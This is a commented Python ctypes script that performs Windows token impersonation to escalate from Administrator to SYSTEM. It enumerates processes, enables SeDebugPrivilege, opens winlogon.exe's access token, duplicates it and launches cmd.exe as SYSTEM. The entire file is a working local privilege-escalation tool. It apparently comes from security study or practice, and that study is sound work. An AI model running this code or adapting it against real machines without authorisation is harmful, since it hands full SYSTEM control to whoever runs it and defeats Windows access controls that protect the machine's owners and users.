"""
(prod) Token Impersonation -> PrivEsc to spawn cmd.exe as SYSTEM
- enable SeDebugPrivilege in chosen process (python.exe <- cmd.exe)
- open handle to AccessToken for process running as SYSTEM
- duplicate token, spawn new process (cmd.exe) with duplicated token


Caveat:
-------
- requires script run as Administrator -> in order to enabled SeDebugPrivilege
- hard-coded to target winlogon.exe, to clone AccessToken of SYSTEM process


Steps:
------
PID information/selection
    - Choose PID from list (grouped by ProcessName)
    - OpenProcess()             -> get handle to process
    - OpenProcessToken()        -> get handle to access token

AccessToken manipulation
    - GetTokenInformation()     -> return buffer that contains all privileges access token
    - LookupPrivilegeNameW()    -> iterate and print
    - AdjustTokenPrivileges()   -> modify privilege(s), enable SeDebugPrivilege

Find process running as SYSTEM
    - (alt) iterate through snapshot, return dict/list for SYSTEM processes
    - (alt) cheat, look for known processes (lsass.exe, svchost.exe, winlogon.exe)
    - OpenProcess() -> OpenProcessToken()

Token Impersonation -> Privilege Escalation
    - DuplicateTokenEx()        -> create token with privilges to SYSTEM process (ie, winlogon.exe)
    - CreateProcessWithTokenW() -> spawn cmd.exe as SYSTEM

"""

import ctypes
from ctypes import wintypes
from collections import defaultdict
from contextlib import contextmanager

# import DLLs
kernel32 = ctypes.WinDLL('kernel32.dll', use_last_error=True)
advapi32 = ctypes.WinDLL('advapi32.dll', use_last_error=True)


# ---------------------------------------------------
#                   CONSTANTS
# ---------------------------------------------------


# CreateProcessWithTokenW()
    # ----- dwLogonFlags
LOGON_WITH_PROFILE          = 0x01
LOGON_NETCREDENTIALS_ONLY   = 0x02

    # ----- dwCreationFlags
DEBUG_PROCESS           = 0x01
DEBUG_ONLY_THIS_PROCESS = 0x02
CREATE_SUSPENDED        = 0x04
CREATE_NEW_CONSOLE      = 0x10
CREATE_NO_WINDOW        = 0x08000000

# CreateToolhelp32Snapshot() - samlpes
INVALID_HANDLE_VALUE    = wintypes.HANDLE(-1)
TH32CS_SNAPPROCESS      = 0x02
TH32CS_SNAPTHREAD       = 0x04

# CreateWellKnownSid
WinLocalSystemSid       = 22 # local SYSTEM

# DuplicateTokenEx()
MAXIMUM_ALLOWED         = 0x02000000
TOKEN_ALL_ACCESS        = 0x0F01FF
TOKEN_ASSIGN_PRIMARY    = 0x01
TOKEN_DUPLICATE         = 0x02
TOKEN_IMPERSONATE       = 0x04
TOKEN_QUERY             = 0x08

    # -- ImpersonationLevel
SecurityAnonymous       = 1
SecurityIdentification  = 2
SecurityImpersonation   = 3
SecurityDelegation      = 4

    # -- Token_Type / TokenType
TokenPrimary            = 1
TokenImpersonation      = 2

# GetTokenInformation()
TokenUser           = 1
TokenPrivileges     = 3

# LUID_AND_ATTRIBUTES()
SE_PRIVILEGE_DISABLED	        = 0X00
SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0X01
SE_PRIVILEGE_ENABLED	        = 0X02
SE_PRIVILEGE_REMOVED            = 0x04
SE_PRIVILEGE_USED_FOR_ACCESS    = 0x80000000

# OpenProcess()
PROCESS_ALL_ACCESS  = 0x1F0FFF

# PROCESSENTRY32W() struct
MAX_PATH = 260

# PRIVILEGE_SET()
PRIVILEGE_SET_ALL_NECESSARY = 0x01 


# ---------------------------------------------------
#               Struct Definitions
# ---------------------------------------------------

class LUID(ctypes.Structure):           # LUID is a 64-bit value, used here to identify privileges
	_fields_ = [                        # - two parts refer to lower/higher 32-bits of id (LSB/MSB)
	("LowPart",		wintypes.DWORD),    # - reason for DWORD v LONG is historical
	("HighPart", 	wintypes.LONG),
	]

class LUID_AND_ATTRIBUTES(ctypes.Structure):
	_fields_ = [
	("Luid", 		LUID),
	("Attributes", 	wintypes.DWORD),
	]

class PRIVILEGE_SET(ctypes.Structure):
	_fields_ = [
	("PrivilegeCount",	wintypes.DWORD),
	("Control", 		wintypes.DWORD),
	("Privilege", 		LUID_AND_ATTRIBUTES),
	]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess",    wintypes.HANDLE),
        ("hThread",     wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId",  wintypes.DWORD),    
    ]

class PROCESSENTRY32W(ctypes.Structure):
    _fields_ = [
        ("dwSize",              wintypes.DWORD),
        ("cntUsage",            wintypes.DWORD),
        ("th32ProcessID",       wintypes.DWORD),
        ("th32DefaultHeapID",   ctypes.c_size_t),
        ("th32ModuleID",        wintypes.DWORD),
        ("cntThreads",          wintypes.DWORD),
        ("th32ParentProcessID", wintypes.DWORD),
        ("pcPriClassBase",      wintypes.LONG),
        ("dwFlags",             wintypes.DWORD),
        ("szExeFile",           wintypes.WCHAR * MAX_PATH)
]

class STARTUPINFOW(ctypes.Structure):
    _fields_ = [
        ("cb",                wintypes.DWORD),
        ("lpReserved",        wintypes.LPWSTR),
        ("lpDesktop",         wintypes.LPWSTR),
        ("lpTitle",           wintypes.LPWSTR),
        ("dwX",               wintypes.DWORD),
        ("dwY",               wintypes.DWORD),
        ("dwXSize",           wintypes.DWORD),
        ("dwYSize",           wintypes.DWORD),
        ("dwXCountChars",     wintypes.DWORD),
        ("dwYCountChars",     wintypes.DWORD),
        ("dwFillAttribute",   wintypes.DWORD),
        ("dwFlags",           wintypes.DWORD),
        ("wShowWindow",       wintypes.WORD),
        ("cbReserved2",       wintypes.WORD),
        ("lpReserved2",       wintypes.LPBYTE),
        ("hStdInput",         wintypes.HANDLE),
        ("hStdOutput",        wintypes.HANDLE),
        ("hStdError",         wintypes.HANDLE),
    ]

# dynamic struct creation, to handle variable-length access tokens
def tokenPrivileges_createStruct(length):
    class TOKEN_PRIVILEGES(ctypes.Structure):
        _fields_ = [
            ("PrivilegeCount",  wintypes.DWORD),
            ("Privileges",      LUID_AND_ATTRIBUTES * length),
        ]
    return TOKEN_PRIVILEGES


# ---------------------------------------------------
#               Function Prototypes
# ---------------------------------------------------

# ----- kernel32.dll -----
kernel32.CloseHandle.argtypes = [wintypes.HANDLE,]  # hObject
kernel32.CloseHandle.restype = wintypes.BOOL

kernel32.CreateToolhelp32Snapshot.argtypes = [
    wintypes.DWORD,     # dwFlags
    wintypes.DWORD,     # th32ProcessID
]
kernel32.CreateToolhelp32Snapshot.restype = wintypes.HANDLE

kernel32.OpenProcess.argtypes = [
    wintypes.DWORD,         # dwDesiredAccess
    wintypes.BOOL,          # bInheritHandle
    wintypes.DWORD,         # dwProcessId
]
kernel32.OpenProcess.restype = wintypes.HANDLE

kernel32.Process32FirstW.argtypes = [
    wintypes.HANDLE,                    # hSnapshot
    ctypes.POINTER(PROCESSENTRY32W),    # [o] lppe, proc-list entry from snapshot
]
kernel32.Process32FirstW.restype = wintypes.BOOL

kernel32.Process32NextW.argtypes = [
    wintypes.HANDLE,                    # hSnapshot
    ctypes.POINTER(PROCESSENTRY32W),    # [o] lppe, proc-list entry from snapshot
]
kernel32.Process32NextW.restype = wintypes.BOOL


# ----- advapi32.dll -----


# NOTE: NewState/PreviousState -> ctypes.c_void_p as workaround
# - originally set at ctypes.POINTER(TOKEN_PRIVILEGES)
# - however NameError thrown as struct not actually defined yet (only set in dynamic function above)
advapi32.AdjustTokenPrivileges.argtypes = [
    wintypes.HANDLE,                    # TokenHandle
    wintypes.BOOL,                      # DisableAllPrivileges
    ctypes.c_void_p,                    # NewState (new TOKEN_PRIVILEGES struct) (opt)
    wintypes.DWORD,                     # BufferLength
    ctypes.c_void_p,                    # [o] PreviousState (opt)
    ctypes.POINTER(wintypes.DWORD),     # [o] ReturnLength (opt)
]
advapi32.AdjustTokenPrivileges.restype = wintypes.BOOL

advapi32.CreateProcessWithTokenW.argtypes = [
    wintypes.HANDLE,                    # hToken
    wintypes.DWORD,                     # dwLogonFlags (can be 0)
    wintypes.LPCWSTR,                   # lpApplicationName (opt) (eg, r"c:\\windows\\system32\\cmd.exe")
    wintypes.LPWSTR,                    # [i/o] lpCommandLine (opt)
    wintypes.DWORD,                     # dwCreationFlags
    wintypes.LPVOID,                    # lpEnvironment (opt)
    wintypes.LPCWSTR,                   # lpCurrentDirectory (opt)
    ctypes.POINTER(STARTUPINFOW),       # lpStartupInfo
    ctypes.POINTER(PROCESS_INFORMATION),# [O] lpProcessInformation
]
advapi32.CreateProcessWithTokenW.restype = wintypes.BOOL

advapi32.CreateWellKnownSid.argtypes = [
    wintypes.INT,                       # WellKnownSidType (22, S-1-5-18 = WinLocalSystemSid / SYSTEM)
    ctypes.c_void_p,                    # DomainSid (opt), ptr to domain SID (Null == local computer)
    ctypes.c_void_p,                    # [o] pSid (opt), ptr to store new SID
    ctypes.POINTER(wintypes.DWORD),     # [i/o] cbSid, size of pSid
]
advapi32.CreateWellKnownSid.restype = wintypes.BOOL

advapi32.DuplicateTokenEx.argtypes = [
    wintypes.HANDLE,                    # hExistingToken (existing handle to access token)
    wintypes.DWORD,                     # dwDesiredAccess
    ctypes.c_void_p,                    # lpTokenAttributes (opt, can be None)
    wintypes.INT,                       # ImpersonationLevel
    wintypes.INT,                       # TokenType
    ctypes.POINTER(wintypes.HANDLE)     # [o] phNewToken (ptr to receive handle)
]
advapi32.DuplicateTokenEx.restype = wintypes.BOOL

advapi32.GetTokenInformation.argtypes = [
    wintypes.HANDLE,                # TokenHandle
    wintypes.INT,                   # TokenInformationClass
    ctypes.c_void_p,                # [o] TokenInformation (opt)
    wintypes.DWORD,                 # TokenInformationLength
    ctypes.POINTER(wintypes.DWORD)  # [o] ReturnLength
]
advapi32.GetTokenInformation.restype = wintypes.BOOL

advapi32.LookupPrivilegeNameW.argtypes = [
    wintypes.LPCWSTR,               # lpSystemName (opt, None)
    ctypes.POINTER(LUID),           # lpLuid
    wintypes.LPWSTR,                # [o] lpName (opt)
    ctypes.POINTER(wintypes.DWORD)  # [i/o] cchName, size/length of lpName (!including null-terminator)
]
advapi32.LookupPrivilegeNameW.restype = wintypes.BOOL

advapi32.OpenProcessToken.argtypes = [
    wintypes.HANDLE,                    # ProcessHandle
    wintypes.DWORD,                     # DesiredAccess
    ctypes.POINTER(wintypes.HANDLE),    # [o] TokenHandle
    ]
advapi32.OpenProcessToken.restype = wintypes.BOOL

advapi32.PrivilegeCheck.argtypes = [
	wintypes.HANDLE,							# ClientToken, handle to AccessToken
	ctypes.POINTER(PRIVILEGE_SET),	            # [i/o] RequiredPrivileges, pointer to PRIVILEGE_SET()
	ctypes.POINTER(wintypes.BOOL),				# [o] pfResult, whether any/all priv(s) are enabled in AccessToken
]
advapi32.PrivilegeCheck.restype = wintypes.BOOL


# --------------------------------------------------
#               Function Definitions
# --------------------------------------------------

# ------------- Misc help functions ----------------

def winerr() -> OSError:
    """ return a ctypes.WinError() with last Windows API error """
    return ctypes.WinError(ctypes.get_last_error())


def close_handle(handle, name="Handle", id_number: int | None = None) -> None:
    """ Close open handles to avoid resource leaks """

    # ----- error checking
    if handle is None or handle.value == 0:
        raise ValueError(f"\n[!] Warning: {name} is None or invalid -> nothing to close")
        
    if not kernel32.CloseHandle(handle):
        raise winerr()
    
    # ----- if handle associated with a thread/process id
    if id_number:
        print(f"    -> Closed handle to {name}: ({handle.value}) [{name} ID: {id_number}]")
    else:
        print(f"    -> Closed handle to {name}: ({handle.value})")


def key_sort(name: str) -> str:
    """ Ensure processes sorted alphabetically, regardless of case """
    return name.casefold()


# --------------- Process Id information ---------------
# section added to replace the powerscript block for listing/grouping process id information


def group_pids_by_process() -> tuple[
        defaultdict[str, list[int]],
        dict[int, str]
        ]:

    """
    Snapshot taken of running processes -> TH32CS_SNAPPROCESS
    - iterated by Process32FirstW() -> Process32NextW() until empty

    Returns a numer of dictionaries later used for different purposes
    [+] proc_groups: 
    - defaultdict() of process names, and list of associated PIDs
    - for iteration of full-print out 

    [+] pid_to_proc_map: O(1)
    - PID validation, 1:1 of PID to process name
    """

    # proc_groups -> for iterating whole list in full print-out
    proc_groups: defaultdict[str, list[int]] = defaultdict(list)

    # pid_proc_map -> fast search for later-on PID validation
    pid_to_proc_map: dict[int, str] = {}

    pe32w = PROCESSENTRY32W()
    pe32w.dwSize = ctypes.sizeof(PROCESSENTRY32W)

    # Context Manager - snapshot
    with snapshot(TH32CS_SNAPPROCESS) as hSnapshot: 
        if not kernel32.Process32FirstW(hSnapshot, ctypes.byref(pe32w)):
            raise winerr()

        print("    -> Taking Snapshot: Running Processes... ", end='', flush=True)

        while True:
            name = pe32w.szExeFile      # process name
            pid  = pe32w.th32ProcessID  # leave PIDs as ints in list

            proc_groups[name].append(pid)
            pid_to_proc_map[pid] = name
                
            if not kernel32.Process32NextW(hSnapshot, ctypes.byref(pe32w)):
                break

        print("Completed")

    return proc_groups, pid_to_proc_map




def print_pids_by_process(process_groups: dict[str, list[int]]) -> None:
    """
    Print Process Names -> associated PIDs -> count of PIDs
    - sorted alphabetically, then numerically
    - PID list truncated if too long (eg svchost.exe)
    """

    # header info
    print(f"\n{'Process Name':<40} {'PID':<40} {'Count':>5}\n" + '-' * 87)

    for process_name in sorted(process_groups.keys(), key=key_sort):
        sorted_pids = sorted(process_groups[process_name])
        
        # join pids -> must first be converted to type str()
        pid_list_str = ', '.join(str(pid) for pid in sorted_pids)
        
        count = len(sorted_pids)
        
        # truncate long list of PIDs
        if len(pid_list_str) > 35:
            pid_list_str = pid_list_str[:35] + '...'
        
        print(f"{process_name:<40} {pid_list_str:<40} {count:<5}")




def request_pid(pid_map: dict[int, str]) -> int:
    """ Return positive integer -> later validate if actual PID """
    while True:
        try:
            pid = int(input("\nPlease enter a valid PID: "))
            if pid > 0:
                if validate_pid(pid, pid_map):
                    return pid
            else:
                print("[!] Please enter a positive integer: ")
        except ValueError as e:
            print(f"\n[!] Invalid Input, Error: {e}")




def validate_pid(pid: int, pid_map: dict[int, str]) -> bool:
    """ Checks if PID exists in previous 'fast-search' dict map """
    
    process_name = pid_map.get(pid)

    if process_name:
        print(f"\n[+] PID found: {pid} ({process_name})")
        return True
    else:
        print(f"[!] Error: PID {pid} not found in snapshot")
        return False


# ---------------------------- Main functions -------------------------------


def get_handle_to_open_process(
    dwDesiredAccess: wintypes.DWORD, 
    bInheritHandle: wintypes.BOOL, 
    dwProcessId: wintypes.DWORD) -> wintypes.HANDLE:

    """ Return handle to open process """

    proc_handle = kernel32.OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId)
    if not proc_handle:
        raise winerr()   

    print(f"    -> Opened handle to Process: {proc_handle}")
    
    # forcing return of HANDLE/c_void_p -> insists on returning an 'int' type
    # - despite function prototype OR pre-instantiating wintypes.HANDLE() object
    return wintypes.HANDLE(proc_handle)




def open_proc_token(
    ProcessHandle: wintypes.HANDLE,
    DesiredAccess: wintypes.DWORD) -> wintypes.HANDLE:

    """ TokenHandle: a pointer to a handle that identifies newly opened access token """

    token_handle = wintypes.HANDLE()
    if not advapi32.OpenProcessToken(ProcessHandle, DesiredAccess, ctypes.byref(token_handle)):
        raise winerr()

    print(f"    -> Opened handle to AccessToken: {token_handle.value}")
    return token_handle




def get_access_token_buffer(
        token_handle: wintypes.HANDLE,
        TokenInformationClass: int,
        ) -> ctypes.Struct:

    """
    Retrieve AccessToken information, buffer copied to maintain persistence
    
    (from docs) When passing "TokenPrivileges" (3) as TokenInformationClass, the buffer receives a TOKEN_PRIVILEGES() struct
 
    for 'array_length', we cast the buffer against a pointer that reads the PrivilegeCount field
    - ie, assign the first 4-bytes (DWORD) of the buffer, to the variable 'array_length'
    - variable required for when casting the buffer to a TOKEN_PRIVILEGES() struct

    memory layout of buffer:
    ------------------------
    [DWORD PrivilegeCount]      <- 'array_length' reads in this value
    [LUID_AND_ATTRIBUTES #1]
    [LUID_AND_ATTRIBUTES #2]
    [LUID_AND_ATTRIBUTES #n]

    """

    # double-call probe to find correct size for buffer
    size = wintypes.DWORD()
    advapi32.GetTokenInformation(token_handle, TokenInformationClass, None, 0, ctypes.byref(size))

    # second call
    buffer = ctypes.create_string_buffer(size.value)
    if not advapi32.GetTokenInformation(token_handle, TokenInformationClass, buffer, size.value, ctypes.byref(size)):
        raise winerr()

    # read 'PrivilegeCount' field in buffer
    array_length = ctypes.cast(buffer, ctypes.POINTER(wintypes.DWORD)).contents.value 


    # ----- copy buffer to TP() struct instance -> ensure persistence
    tp = tokenPrivileges_createStruct(array_length)
    return tp.from_buffer_copy(buffer)




def enumerate_access_token_privileges(
        token_privileges: ctypes.Structure,
        index = None,
        old_attr = None):

    """
    Print AccessToken privilege information
        - default: all values
        - index: prints specific privilege, before/after modification
    """

    # different headers for printing privilege information
    if not index:
        msg = f"\n[+] Privileges in Access Token: {token_privileges.PrivilegeCount}\n"
        print(msg + "-" * len(msg.strip()))
    elif (index) and (old_attr is not None):
        msg = f"\n\n[+] Modifying Selected Privilege in Access Token:\n"
        print(msg + "-" * len(msg.strip()))

        # define old status, for showing transition from Old -> New setting
        old_privilege_status = 'Enabled' if (old_attr & SE_PRIVILEGE_ENABLED) else 'Disabled'

    
    # ----- iterate through LUID_AND_ATTRIBUTES() structs in buffer -----
    indices = range(token_privileges.PrivilegeCount) if index is None else [index]

    for i in indices:
        privilege = token_privileges.Privileges[i]
        privilege_status = 'Enabled' if (privilege.Attributes & SE_PRIVILEGE_ENABLED) else 'Disabled'
        
        # double-call - probe
        size_name = wintypes.DWORD()
        advapi32.LookupPrivilegeNameW(None, ctypes.byref(privilege.Luid), None, ctypes.byref(size_name))
     
        # second call
        privilege_name = ctypes.create_unicode_buffer(size_name.value)
        if not advapi32.LookupPrivilegeNameW(None, ctypes.byref(privilege.Luid), privilege_name, ctypes.byref(size_name)):
            print(f"[!] LookupPrivilegeNameW() Failed, LUID: ({privilege.Luid.HighPart}, {privilege.Luid.LowPart})")
            continue

        # default - full print
        if not index: 
            print(f" {i} -> {privilege_name.value:<50}  {privilege_status:<10} LUID: ({privilege.Luid.HighPart}, {privilege.Luid.LowPart})")
        elif (index) and (old_attr is not None):
            print(f"    -> Privilege: {privilege_name.value}")
            print(f"    -> Status:    {old_privilege_status} -> {privilege_status}")




def get_privilege_selection(buf: ctypes.Structure) -> tuple[int | None, ctypes.Structure | None]:
    """
    Return one of following tuples:
    - int, ctypes.Structre : index for privileve, and associated LAA struct
    - None, None : in case user wants to exit
    """

    array_length = buf.PrivilegeCount
    while True:
        user_input = input(f"\nEnter Privilege-index to flip [0-{array_length -1}] (or 'C' to continue/exit): ")

        if user_input == 'C':
            return None, None

        try:
            i = int(user_input)

            if (0 <= i < array_length):
                # return index and individual LUID_AND_ATTRIBUTES() struct
                return i, buf.Privileges[i]

            print(f"[!] Please enter a valid index value")
                
        except ValueError as e:
            print(f"\n[!] Invalid Input, Error: {e}")




def flip_privilege_setting(
        TokenHandle: wintypes.HANDLE, 
        buffer: ctypes.Structure) -> int:

    """
    Modify individual privilege setting (eg, enabled -> disabled, or disabled -> enabled
    - requires creation of new TOKEN_PRIVILEGES() struct to pass to AdjustTokenPrivileges()
    """
    
    # flip attribute - bitwise &
    old_attr = buffer.Attributes
    new_attr = SE_PRIVILEGE_DISABLED if (buffer.Attributes & SE_PRIVILEGE_ENABLED) else SE_PRIVILEGE_ENABLED

    # immediately instantiate with array length of 1 element -> handles TypeError() errors
    tp = tokenPrivileges_createStruct(1)()
    tp.PrivilegeCount = 1
    tp.Privileges[0].Luid = buffer.Luid
    tp.Privileges[0].Attributes = new_attr # invert current setting


    # CAVEAT: AdjustTokenPrivileges() returns TRUE upon successful execution of function call
    # - NOT whether assignment occurred successfully
    # - need to check ctypes.get_last_error() to verify successful assignment

    ctypes.set_last_error(0)        # clear out any stale errors prior to function call

    if not advapi32.AdjustTokenPrivileges(TokenHandle, False, ctypes.byref(tp), 0, None, None):
        raise winerr()

    error = ctypes.get_last_error()

    if error == 1300:
        print(f"\n[!] Error code: {error}, Privilege not held by token")
    elif error != 0:
        print(f"\n[!] Unexpected error, Code: {error}")


    return old_attr




def get_duplicate_token(hToken: wintypes.HANDLE) -> wintypes.HANDLE:
    """ Return handle to duplicate Access Token """

    dwDesiredAccess = TOKEN_ALL_ACCESS
    ImpersonationLevel = SecurityImpersonation
    TokenType = TokenPrimary
    new_hToken = wintypes.HANDLE(0)

    print(f"\n[+] Duplicating AccessToken privileges:")
    if not advapi32.DuplicateTokenEx(
        hToken, 
        dwDesiredAccess, 
        None,   # no SECURITY_ATTRIBUTES() descriptor
        ImpersonationLevel,
        TokenType,
        ctypes.byref(new_hToken)
    ):
        raise winerr()

    print(f"    -> Success, new handle: {new_hToken.value}")
    return new_hToken


# ----------------------------------
#       Context Managers
# ----------------------------------
#
# to use as 'with x as y'

@contextmanager
def snapshot(flags=TH32CS_SNAPPROCESS):

    print("\n[+] Creating handle to Snapshot: ", end='')
    hSnapshot = wintypes.HANDLE(kernel32.CreateToolhelp32Snapshot(flags, 0))

    if hSnapshot.value == INVALID_HANDLE_VALUE.value:
        raise winerr()

    print(f"Successful ({hSnapshot.value})")

    try:
        yield hSnapshot     # give caller, access to handle
    finally:
        close_handle(hSnapshot, "Snapshot")
        hSnapshot.value = 0


# ------------------------------------------
#           Main Execution Block
# ------------------------------------------

# list processes, pids and selection
proc_groups, pid_map = group_pids_by_process()
print_pids_by_process(proc_groups)
chosen_pid = request_pid(pid_map)


# get handles and tokens
handle_process = get_handle_to_open_process(PROCESS_ALL_ACCESS, False, chosen_pid)
handle_access_token = open_proc_token(handle_process, TOKEN_ALL_ACCESS)


# loop through privileges, flipping them one by one per selection
while True:

    # display all privileges in process' access token
    buf_access_token_privileges = get_access_token_buffer(handle_access_token, TokenPrivileges)
    enumerate_access_token_privileges(buf_access_token_privileges)


    # choose privilege to flip -> execute change
    selected_priv_index, selected_priv_buffer = get_privilege_selection(buf_access_token_privileges)
    if selected_priv_index is None:
        print(f"\n[+] Duplicating Current Access Token settings...")
        break
    # execute flip
    old_setting = flip_privilege_setting(handle_access_token, selected_priv_buffer)


    # verify changes
    buf_access_token_privileges = get_access_token_buffer(handle_access_token, TokenPrivileges)
    enumerate_access_token_privileges(buf_access_token_privileges, selected_priv_index, old_setting)

    print(f"\n" + "=" * 80)




# Cheat/be-lazy, just target winlogon.exe
winlogon_pids = [pid for pid,name in pid_map.items() if name.lower() == "winlogon.exe"]
if winlogon_pids:
    winlogon_pid = winlogon_pids[0]


# duplicate access token for SYSTEM process (winlogon.exe)
winlogon_hProcess = get_handle_to_open_process(PROCESS_ALL_ACCESS, False, winlogon_pid)
winlogon_hAccessToken = open_proc_token(winlogon_hProcess, TOKEN_QUERY | TOKEN_DUPLICATE)
new_access_token = get_duplicate_token(winlogon_hAccessToken)


# spawn cmd.exe as SYSTEM
si = STARTUPINFOW()
si.cb = ctypes.sizeof(STARTUPINFOW)
si.lpDesktop = "winsta0\\default"   # force windows onto screen

pi = PROCESS_INFORMATION()

app_name = r"c:\\windows\\system32\\cmd.exe"
if not advapi32.CreateProcessWithTokenW(
    new_access_token,
    0,                  # dwLogonFlags
    app_name,
    None,               # lpCommandLine
    CREATE_NEW_CONSOLE, # dwCreationFlags
    None,               # lpEnvironment
    None,               # lpCurrentDirectory
    ctypes.byref(si),   # lpStartupInfo
    ctypes.byref(pi)
):
    raise winerr()




# cleanup
print("\n[+] Cleaning up: CloseHanddele()")
close_handle(handle_process, "Process", chosen_pid)
close_handle(handle_access_token, "AccessToken_original")
close_handle(new_access_token, "AccessToken_winlogon")
